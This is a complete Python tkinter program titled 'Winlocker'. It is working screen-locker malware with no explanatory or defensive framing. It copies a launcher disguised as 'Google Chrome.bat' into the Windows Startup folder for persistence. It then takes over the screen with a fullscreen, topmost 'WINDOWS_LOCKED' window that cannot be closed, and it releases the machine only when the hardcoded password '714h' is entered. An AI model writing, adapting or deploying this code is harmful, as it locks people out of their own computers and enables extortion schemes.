import tkinter
from tkinter import *
import tkinter as tk
from tkinter import ttk
import getpass
import sys
import os
import os.path
import pyautogui
from time import sleep

class Locker():

    def __init__(self):
        self.win = Tk()
        self.win.title('Winlocker')
        self.win.geometry('500x500')
        self.user_name = getpass.getuser()
        self.win['bg'] = 'black'
    
    def main_locker(self):
        n_w = 1920
        n_h = 1080
        s_w = self.win.winfo_screenwidth()
        s_h = self.win.winfo_screenheight()
        percentage_w = s_w/(n_w/100)
        percentage_h = s_w/(n_h/100)
        s_f = ((percentage_w + percentage_h)/2)/100
        font_size = int(20*s_f)
        mini_size = 10 
        if font_size<mini_size:font_size = mini_size
        fontsize_H = int(72*s_f)
        mini_size = 40
        if fontsize_H<mini_size:fontsize_H = mini_size
        d_style = ttk.Style()
        d_style.configure('New.TButton', font=('Arial', font_size))
        def to_the_moon(filepath=''):
            if filepath=='':filepath = os.path.dirname(os.path.realpath(__file__))
            b_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % self.user_name
            with open(b_path + '\\' + "Google Chrome.bat", "w+") as b_file:b_file.write(r'start "" %s' % filepath)
        def neverfadeaway():
            pyautogui.moveTo(x=680,y=800)
            self.win.protocol("WM_DELETE_WINDOW", neverfadeaway)
            self.win.update()
        def f_screen():
            self.win.attributes('-fullscreen',True,'-topmost',True)
        def clicked():
            r = format(txt.get())
            if r == '714h':
                filepath = '/tmp/file.txt'
                filepath = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Google Chrome.bat' % self.user_name
                os.remove(filepath)
                sys.exit()
                
        to_the_moon("C:\\myFiles\\locker.py")
        neverfadeaway()
        f_screen()
        txt_one = Label(self.win, text='WINDOWS_LOCKED', font=("Arial Bold", fontsize_H), fg='red', bg='black')
        txt_three = Label(self.win, text='WINDOWS_LOCKED', font=("Arial Bold", font_size), fg='white', bg='black')
        txt_one.grid(column=0,row=0),txt_three.grid(column=0,row=0)
        txt_one.place(relx = .01, rely = .01),txt_three.place(relx = .01, rely = .21)
        txt = Entry(self.win)
        btn = Button(self.win, text="passw", command=clicked)  
        txt.place(relx = .28, rely = .5, relwidth=.3, relheight=.06)
        btn.place(relx = .62, rely = .5, relwidth=.1, relheight=.06)
        self.win.mainloop()


Locker().main_locker()